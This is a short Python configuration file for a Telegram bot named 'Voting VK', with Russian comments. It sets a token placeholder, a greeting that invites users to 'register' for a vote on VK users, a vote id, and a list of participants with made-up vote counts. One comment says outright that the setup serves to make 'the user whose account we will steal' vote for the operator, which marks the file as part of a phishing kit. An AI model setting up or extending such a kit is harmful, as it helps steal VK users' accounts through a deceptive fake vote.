bot_token = 'TOKEN' # сюда вводим токен который нам дал BotFather

bot_name = 'Voting VK' # Пишем имя бота

hello_text = f'👋 Привет я {bot_name} для голосований за пользователей ВК для начала давай пройдем регистрацию' # это приветствующие сообщение его можно не менять

vote_id = '42353928' # айди голосования который надо будет ввести боту что проголосовать



# пример заполнения нам нужно в одной из списков ввести имена вашего аккаунта в вк чтобы пользователь у которого мы будем воровать аккаунт проголосовал за вас

# participant = ["Имя участника", "Фамилия участника", "Кол-во голосов"]



participant1 = ["Илья", "-", 20]

participant2 = ["Иван", "-", 25]

participant3 = ["Александр", "-", 30]

participant4 = ["Максим", "-", 50]